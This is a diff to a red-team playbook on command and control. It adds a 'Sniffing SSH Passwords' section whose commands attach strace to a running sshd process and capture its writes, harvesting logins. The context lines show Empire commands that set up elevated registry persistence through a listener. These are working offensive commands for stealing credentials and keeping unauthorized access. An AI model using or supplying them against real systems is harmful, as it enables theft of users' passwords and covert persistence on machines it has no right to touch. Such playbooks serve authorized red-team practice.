@@ -5,6 +5,7 @@
 - [Tooling](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/6-Command-and-Control/6-Command-and-Control.md#Tooling)
 - [C2 Installation](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/6-Command-and-Control/6-Command-and-Control.md#C2-Installation)
 - [Empire](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/6-Command-and-Control/6-Command-and-Control.md#Empire)
+- [Sniffing SSH Passwords](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/6-Command-and-Control/6-Command-and-Control.md#Sniffing-SSH-Passwords)
 
 ## Tooling
 
@@ -580,6 +581,14 @@ c2ops@c2:~/opt/wordlists$ git clone https://github.com/danielmiessler/SecLists.g
 (Empire: <NAME>) > usemodule powershell/persistence/elevated/registry
 (Empire: <NAME>/powershell/persistence/elevated/registry) > set Listener <NAME>
 (Empire: <NAME>/powershell/persistence/elevated/registry) > run
+```
+
+## Sniffing SSH Passwords
+
+```c
+$ pgrep -l sshd
+6235 sshd
+$ strace -f -p 6235 -e trace=write -o capture
 ```
 
 
